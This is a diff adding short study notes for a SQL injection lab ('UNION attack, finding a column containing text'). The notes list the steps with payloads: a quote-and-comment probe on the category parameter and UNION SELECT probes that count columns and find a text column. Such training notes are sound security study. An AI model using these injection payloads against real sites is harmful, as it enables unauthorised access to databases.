@@ -142,3 +142,15 @@ Lab7: SQL injection UNION attack, determining the number of columns returned by 
 ______________________________________________________________________________________________________________________________________________
 Lab8: SQL injection UNION attack, finding a column containing text
 
+PRINT THIS 'LJXwKG' USING UNION
+
+      -FIND THE VULNERABLE PARAMETERS
+      GET /filter?category=Pets'--+ HTTP/2
+
+
+
+      -fIND THE NO. OF COLUMNS 
+      'UNION SELECT NULL,NULL,NULL,NULL --+
+
+      -FIND THE DATA TYPE OF COLUMNS
+      'UNION SELECT NULL,'LJXwKG',113 --+
